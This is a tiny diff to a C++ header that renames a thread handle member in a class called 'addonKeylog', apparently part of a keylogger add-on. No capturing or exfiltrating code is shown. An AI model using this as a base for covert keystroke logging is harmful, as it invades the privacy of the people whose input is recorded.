@@ -10,7 +10,7 @@ class addonKeylog
 {
 public:
 	bool keylog_active;
-	HANDLE keylogThread;
+	HANDLE keylogHandle;
 
 	addonKeylog();
 	~addonKeylog();
